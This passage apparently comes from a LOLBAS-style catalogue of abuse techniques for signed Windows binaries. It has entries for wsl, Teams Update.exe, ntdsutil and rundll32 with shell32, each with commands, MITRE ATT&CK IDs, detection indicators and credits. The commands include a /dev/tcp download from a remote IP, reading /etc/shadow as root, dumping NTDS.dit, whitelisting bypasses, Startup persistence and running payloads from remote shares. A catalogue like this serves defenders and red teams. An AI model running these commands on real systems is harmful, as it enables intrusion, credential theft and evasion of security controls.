                    "Description": "Downloads payload from remote server",
                    "Usecase": "It will download a remote payload and place it in the cache folder",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1105",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 16\\ClientX86\\Root\\Office16\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 16\\ClientX64\\Root\\Office16\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office16\\Powerpnt.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office16\\Powerpnt.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 15\\ClientX86\\Root\\Office15\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 15\\ClientX64\\Root\\Office15\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office15\\Powerpnt.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office15\\Powerpnt.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office 14\\ClientX86\\Root\\Office14\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files\\Microsoft Office 14\\ClientX64\\Root\\Office14\\Powerpnt.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office14\\Powerpnt.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office14\\Powerpnt.exe"},
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\Office12\\Powerpnt.exe"
                },
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe"},
                {"Path": "C:\\Program Files\\Microsoft Office\\Office12\\Powerpnt.exe"},
            ],
            "Resources": [
                {"Link": "https://twitter.com/reegun21/status/1150032506504151040"},
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
                },
            ],
            "Acknowledgement": [
                {"Person": "Reegun J (OCBC Bank)", "Handle": "AT_SYMBOLreegun21"}
            ],
            "pname": "powerpnt",
        },
        {
            "Name": "vsjitdebugger.exe",
            "Description": "Just-In-Time (JIT) debugger included with Visual Studio",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Vsjitdebugger.exe calc.exe",
                    "Description": "Executes calc.exe as a subprocess of Vsjitdebugger.exe.",
                    "Usecase": "Execution of local PE file as a subprocess of Vsjitdebugger.exe.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [{"Path": "c:\\windows\\system32\\vsjitdebugger.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/pabraeken/status/990758590020452353"}
            ],
            "Acknowledgement": [
                {"Person": "Pierre-Alexandre Braeken", "Handle": "AT_SYMBOLpabraeken"}
            ],
            "pname": "vsjitdebugger",
        },
        {
            "Name": "dnx.exe",
            "Description": ".Net Execution environment file included with .Net.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "dnx.exe consoleapp",
                    "Description": "Execute C# code located in the consoleapp folder via 'Program.cs' and 'Project.json' (Note - Requires dependencies)",
                    "Usecase": "Local execution of C# project stored in consoleapp folder.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [{"Path": "N/A"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"}
            ],
            "pname": "dnx",
        },
        {
            "Name": "Wsl.exe",
            "Description": "Windows subsystem for Linux executable",
            "Author": "Matthew Brown",
            "Created": "2019-06-27",
            "Commands": [
                {
                    "Command": "wsl.exe -e /mnt/c/Windows/System32/calc.exe",
                    "Description": "Executes calc.exe from wsl.exe",
                    "Usecase": "Performs execution of specified file, can be used to execute arbitrary Linux commands.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1202",
                    "MitreLink": "https://attack.mitre.org/techniques/T1202",
                    "OperatingSystem": "Windows 10, Windows 19 Server",
                },
                {
                    "Command": "wsl.exe -u root -e cat /etc/shadow",
                    "Description": "Cats /etc/shadow file as root",
                    "Usecase": "Performs execution of arbitrary Linux commands as root without need for password.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1202",
                    "MitreLink": "https://attack.mitre.org/techniques/T1202",
                    "OperatingSystem": "Windows 10, Windows 19 Server",
                },
                {
                    "Command": "wsl.exe --exec bash -c 'cat file'",
                    "Description": "Cats /etc/shadow file as root",
                    "Usecase": "Performs execution of arbitrary Linux commands.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1202",
                    "MitreLink": "https://attack.mitre.org/techniques/T1202",
                    "OperatingSystem": "Windows 10, Windows 19 Server",
                },
                {
                    "Command": "wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'",
                    "Description": "Downloads file from 192.168.1.10",
                    "Usecase": "Download file",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1202",
                    "MitreLink": "https://attack.mitre.org/techniques/T1202",
                    "OperatingSystem": "Windows 10, Windows 19 Server",
                },
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\wsl.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": "Child process from wsl.exe"}],
            "Resources": [
                {
                    "Link": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
                }
            ],
            "Acknowledgement": [
                {"Person": "Alex Ionescu", "Handle": "AT_SYMBOLaionescu"},
                {"Person": "Matt", "Handle": "AT_SYMBOLNotoriousRebel1"},
                {"Person": "Asif Matadar", "Handle": "AT_SYMBOLd1r4c"},
            ],
            "pname": "wsl",
        },
        {
            "Name": "Tracker.exe",
            "Description": "Tool included with Microsoft .Net Framework.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe",
                    "Description": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.",
                    "Usecase": "Injection of locally stored DLL file into target process.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe",
                    "Description": "Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.",
                    "Usecase": "Injection of locally stored DLL file into target process.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [{"Path": None}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/subTee/status/793151392185589760"},
                {"Link": "https://attack.mitre.org/wiki/Execution"},
            ],
            "Acknowledgment": [{"Person": "Casey Smith", "Handle": "AT_SYMBOLsubTee"}],
            "pname": "tracker",
        },
        {
            "Name": "Cdb.exe",
            "Description": "Debugging tool included with Windows Debugging Tools.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "cdb.exe -cf x64_calc.wds -o notepad.exe",
                    "Description": "Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.",
                    "Usecase": "Local execution of assembly shellcode.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\cdb.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\cdb.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html"
                },
                {
                    "Link": "https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/cdb-command-line-options"
                },
                {
                    "Link": "https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda"
                },
            ],
            "Acknoledgement": [
                {"Person": "Matt Graeber", "Handle": "AT_SYMBOLmattifestation"}
            ],
            "pname": "cdb",
        },
        {
            "Name": "Dotnet.exe",
            "Description": "dotnet.exe comes with .NET Framework",
            "Author": "felamos",
            "Created": "2019-11-12",
            "Commands": [
                {
                    "Command": "dotnet.exe [PATH_TO_DLL]",
                    "Description": "dotnet.exe will execute any dll even if applocker is enabled.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 7 and up with .NET installed",
                },
                {
                    "Command": "dotnet.exe [PATH_TO_DLL]",
                    "Description": "dotnet.exe will execute any DLL.",
                    "Usecase": "Execute DLL",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 7 and up with .NET installed",
                },
            ],
            "Full_Path": [{"Path": "C:\\Program Files\\dotnet\\dotnet.exe"}],
            "Detection": [{"IOC": "dotnet.exe spawned an unknown process"}],
            "Resources": [
                {"Link": "https://twitter.com/_felamos/status/1204705548668555264"}
            ],
            "Acknowledgement": [{"Person": "felamos", "Handle": "AT_SYMBOL_felamos"}],
            "pname": "dotnet",
        },
        {
            "Name": "rcsi.exe",
            "Description": "Non-Interactive command line inerface included with Visual Studio.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rcsi.exe bypass.csx",
                    "Description": "Use embedded C# within the csx script to execute the code.",
                    "Usecase": "Local execution of arbitrary C# code stored in local CSX file.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rcsi.exe bypass.csx",
                    "Description": "Use embedded C# within the csx script to execute the code.",
                    "Usecase": "Local execution of arbitrary C# code stored in local CSX file.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                },
            ],
            "Full_Path": [{"Path": None}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {
                    "Link": "https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/"
                }
            ],
            "Acknowledgement": [
                {"Person": "Matt Nelson", "Handle": "AT_SYMBOLenigma0x3"}
            ],
            "pname": "rcsi",
        },
        {
            "Name": "ntdsutil.exe",
            "Description": "Command line utility used to export Actove Directory.",
            "Author": "Tony Lambert",
            "Created": "2020-01-10",
            "Commands": [
                {
                    "Command": 'ntdsutil.exe "ac i ntds" "ifm" "create full c:\\" q q',
                    "Description": "Dump NTDS.dit into folder",
                    "Usecase": "Dumping of Active Directory NTDS.dit database",
                    "Category": "Dump",
                    "Privileges": "Administrator",
                    "MitreID": "T1003",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [{"Path": "C:\\Windows\\System32\\ntdsutil.exe"}],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": 'ntdsutil.exe with command line including "ifm"'}],
            "Resources": [{"Link": "https://adsecurity.org/?p=2398#CreateIFM"}],
            "Acknowledgement": [
                {"Person": "Sean Metcalf", "Handle": "AT_SYMBOLPyroTek3"}
            ],
            "pname": "ntdsutil",
        },
        {
            "Name": "AgentExecutor.exe",
            "Description": "Intune Management Extension included on Intune Managed Devices",
            "Author": "Eleftherios Panos",
            "Created": "23/07/2020",
            "Commands": [
                {
                    "Command": 'AgentExecutor.exe -powershell "c:\\temp\\malicious.ps1" "c:\\temp\\test.log" "c:\\temp\\test1.log" "c:\\temp\\test2.log" 60000 "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0" 0 1',
                    "Description": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument",
                    "Usecase": "Execute unsigned powershell scripts",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
                {
                    "Command": 'AgentExecutor.exe -powershell "c:\\temp\\malicious.ps1" "c:\\temp\\test.log" "c:\\temp\\test1.log" "c:\\temp\\test2.log" 60000 "C:\\temp\\" 0 1',
                    "Description": "If we place a binary named powershell.exe in the path c:\\temp, agentexecutor.exe will execute it successfully",
                    "Usecase": "Execute a provided EXE",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Intune Management Extension"
                }
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [{"Link": None}],
            "Acknowledgement": [
                {"Person": "Eleftherios Panos", "Handle": "AT_SYMBOLlefterispan"}
            ],
            "pname": "agentexecutor",
        },
        {
            "Name": "Dxcap.exe",
            "Description": "DirectX diagnostics/debugger included with Visual Studio.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Dxcap.exe -c C:\\Windows\\System32\\notepad.exe",
                    "Description": "Launch notepad as a subprocess of Dxcap.exe",
                    "Usecase": "Local execution of a process as a subprocess of Dxcap.exe",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {"Path": "C:\\Windows\\System32\\dxcap.exe"},
                {"Path": "C:\\Windows\\SysWOW64\\dxcap.exe"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/harr0ey/status/992008180904419328"}
            ],
            "Acknowledgement": [
                {"Person": "Matt harr0ey", "Handle": "AT_SYMBOLharr0ey"}
            ],
            "pname": "dxcap",
        },
        {
            "Name": "Appvlp.exe",
            "Description": "Application Virtualization Utility Included with Microsoft Office 2016",
            "Author": "",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "AppVLP.exe \\\\webdav\\calc.bat",
                    "Usecase": "Execution of BAT file hosted on Webdav server.",
                    "Description": "Executes calc.bat through AppVLP.exe",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 w/Office 2016",
                },
                {
                    "Command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)\"",
                    "Usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).",
                    "Description": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 w/Office 2016",
                },
                {
                    "Command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\\\webdav\\xll_poc.xll')\"",
                    "Usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).",
                    "Description": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 10 w/Office 2016",
                },
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program Files\\Microsoft Office\\root\\client\\appvlp.exe"
                },
                {
                    "Path": "C:\\Program Files (x86)\\Microsoft Office\\root\\client\\appvlp.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://github.com/MoooKitty/Code-Execution"},
                {"Link": "https://twitter.com/moo_hax/status/892388990686347264"},
                {
                    "Link": "https://enigma0x3.net/2018/06/11/the-tale-of-settingcontent-ms-files/"
                },
                {
                    "Link": "https://securityboulevard.com/2018/07/attackers-test-new-document-attack-vector-that-slips-past-office-defenses/"
                },
            ],
            "Acknowledgement": [
                {"Person": "fab", "Handle": "AT_SYMBOL0rbz_"},
                {"Person": "Will", "Handle": "AT_SYMBOLmoo_hax"},
                {"Person": "Matt Wilson", "Handle": "AT_SYMBOLenigma0x3"},
            ],
            "pname": "appvlp",
        },
        {
            "Name": "Sqlps.exe",
            "Description": "Tool included with Microsoft SQL Server that loads SQL Server cmdlets. Microsoft SQL Server\\100 and 110 are Powershell v2. Microsoft SQL Server\\120 and 130 are Powershell version 4. Replaced by SQLToolsPS.exe in SQL Server 2016, but will be included with installation for compatability reasons.",
            "Author": "Oddvar Moe",
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "Sqlps.exe -noprofile",
                    "Description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
                    "Usecase": "Execute PowerShell commands without ScriptBlock logging.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows",
                }
            ],
            "Full_Path": [
                {
                    "Path": "C:\\Program files (x86)\\Microsoft SQL Server\\100\\Tools\\Binn\\sqlps.exe"
                },
                {
                    "Path": "C:\\Program files (x86)\\Microsoft SQL Server\\110\\Tools\\Binn\\sqlps.exe"
                },
                {
                    "Path": "C:\\Program files (x86)\\Microsoft SQL Server\\120\\Tools\\Binn\\sqlps.exe"
                },
                {
                    "Path": "C:\\Program files (x86)\\Microsoft SQL Server\\130\\Tools\\Binn\\sqlps.exe"
                },
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/bryon_/status/975835709587075072"},
                {
                    "Link": "https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-2017"
                },
            ],
            "Acknowledgement": [{"Person": "Bryon", "Handle": "AT_SYMBOLbryon_"}],
            "pname": "sqlps",
        },
        {
            "Name": "Update.exe",
            "Description": "Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.",
            "Author": "Oddvar Moe",
            "Created": "2019-06-26",
            "Commands": [
                {
                    "Command": "Update.exe --download [url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file and download the nuget package.",
                    "Usecase": "Download binary",
                    "Category": "Download",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --update=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --update=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --update=\\\\remoteserver\\payloadFolder",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --update=\\\\remoteserver\\payloadFolder",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --updateRollback=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --updateRollback=[url to package]",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": 'Update.exe --processStart payload.exe --process-start-args "whatever args"',
                    "Description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
                    "Usecase": "Application Whitelisting Bypass",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --updateRollback=\\\\remoteserver\\payloadFolder",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "Usecase": "Download and execute binary",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --updateRollback=\\\\remoteserver\\payloadFolder",
                    "Description": "The above binary will go to url and look for RELEASES file, download and install the nuget package via SAMBA.",
                    "Usecase": "Download and execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/techniques/T1218/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": 'Update.exe --processStart payload.exe --process-start-args "whatever args"',
                    "Description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
                    "Usecase": "Execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1218",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --createShortcut=payload.exe -l=Startup",
                    "Description": 'Copy your payload into "%localappdata%\\Microsoft\\Teams\\current\\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup". Then payload will run on every login of the user who runs it.',
                    "Usecase": "Execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1547",
                    "MitreLink": "https://attack.mitre.org/techniques/T1547/001/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
                {
                    "Command": "Update.exe --removeShortcut=payload.exe -l=Startup",
                    "Description": 'Run the command to remove the shortcut created in the "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.',
                    "Usecase": "Execute binary",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1070",
                    "MitreLink": "https://attack.mitre.org/techniques/T1070/",
                    "OperatingSystem": "Windows 7 and up with Microsoft Teams installed",
                },
            ],
            "Full_Path": [{"Path": "%localappdata%\\Microsoft\\Teams\\update.exe"}],
            "Code_Sample": [
                {"Code": "https://github.com/jreegun/POC-s/tree/master/nuget-squirrel"}
            ],
            "Detection": [{"IOC": "Update.exe spawned an unknown process"}],
            "Resources": [
                {"Link": "https://www.youtube.com/watch?v=rOP3hnkj7ls"},
                {"Link": "https://twitter.com/reegun21/status/1144182772623269889"},
                {"Link": "https://twitter.com/MrUn1k0d3r/status/1143928885211537408"},
                {"Link": "https://twitter.com/reegun21/status/1291005287034281990"},
                {
                    "Link": "http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/"
                },
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12"
                },
                {
                    "Link": "https://medium.com/AT_SYMBOLreegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56"
                },
                {
                    "Link": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/"
                },
            ],
            "Acknowledgement": [
                {
                    "Person": "Reegun Richard Jayapaul (SpiderLabs, Trustwave)",
                    "Handle": "AT_SYMBOLreegun21",
                },
                {"Person": "Mr.Un1k0d3r", "Handle": "AT_SYMBOLMrUn1k0d3r"},
                {"Person": "Adam", "Handle": "AT_SYMBOLHexacorn"},
                {"Person": "Jesus Galvez"},
            ],
            "pname": "update",
        },
    ],
    "Libraries": [
        {
            "Name": "Shell32.dll",
            "Description": "Windows Shell Common Dll",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe shell32.dll,Control_RunDLL payload.dll",
                    "Description": "Launch a DLL payload by calling the Control_RunDLL function.",
                    "UseCase": "Load a DLL payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
                    "Command": "rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe",
                    "Description": "Launch an executable by calling the ShellExec_RunDLL function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
                {
                    "Command": 'rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"',
                    "Description": "Launch command line by calling the ShellExec_RunDLL function.",
                    "UseCase": "Run an executable payload.",
                    "Category": "Execute",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Not specified",
                },
            ],
            "Full_Path": [
                {"Path": "c:\\windows\\system32\\shell32.dll"},
                {"Path": "c:\\windows\\syswow64\\shell32.dll"},
            ],
            "Code_Sample": [{"Code": None}],
            "Detection": [{"IOC": None}],
            "Resources": [
                {"Link": "https://twitter.com/Hexacorn/status/885258886428725250"},
                {"Link": "https://twitter.com/pabraeken/status/991768766898941953"},
                {
                    "Link": "https://twitter.com/mattifestation/status/776574940128485376"
                },
                {"Link": "https://twitter.com/KyleHanslovan/status/905189665120149506"},
                {"Link": "https://windows10dll.nirsoft.net/shell32_dll.html"},
            ],
            "Acknowledgement": [
                {"Person": "Adam (Control_RunDLL)", "Handle": "AT_SYMBOLhexacorn"},
                {
                    "Person": "Pierre-Alexandre Braeken (ShellExec_RunDLL)",
                    "Handle": "AT_SYMBOLpabraeken",
                },
                {
                    "Person": "Matt Graeber (ShellExec_RunDLL)",
                    "Handle": "AT_SYMBOLmattifestation",
                },
                {
                    "Person": "Kyle Hanslovan (ShellExec_RunDLL)",
                    "Handle": "AT_SYMBOLKyleHanslovan",
                },
            ],
            "pname": "shell32",
        },
        {
            "Name": "Setupapi.dll",
            "Description": "Windows Setup Application Programming Interface",
            "Author": None,
            "Created": "2018-05-25",
            "Commands": [
                {
                    "Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf",
                    "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
                    "UseCase": "Run local or remote script(let) code through INF file specification.",
                    "Category": "AWL Bypass",
                    "Privileges": "User",
                    "MitreID": "T1085",
                    "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085",
                    "OperatingSystem": "Windows",
                },
                {
